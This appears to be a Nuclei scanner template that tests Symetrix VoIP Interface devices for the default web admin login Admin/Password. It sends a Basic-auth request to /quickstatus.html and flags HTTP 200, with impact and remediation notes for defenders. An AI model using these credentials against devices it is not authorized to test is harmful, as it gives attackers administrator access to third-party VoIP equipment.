id: symetrix-default-login

info:
  name: Symetrix VoIP Interface - Default Login
  author: mr-pmillz
  severity: high
  description: |
    Symetrix VoIP Interface devices may retain default credentials for their web administration interface.
    This template checks access using the Admin account and the default password Password.
  impact: |
    An attacker can access VoIP interface status and configuration with administrator privileges.
  remediation: |
    Change the default administrator password and restrict access to the VoIP management interface to trusted hosts.
  reference:
    - https://aveosystems.com/wp-content/uploads/product_pdfs/Symetrix_Radius_Mira_Connect.pdf
  classification:
    cwe-id: CWE-1392
  metadata:
    vendor: symetrix
    product: voip_interface
  tags: default-login,symetrix,voip,intrusive

http:
  - raw:
      - |
        GET /quickstatus.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
        Authorization: Basic {{base64(username + ':' + password)}}
    payloads:
      username:
        - Admin
      password:
        - Password
    attack: pitchfork
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
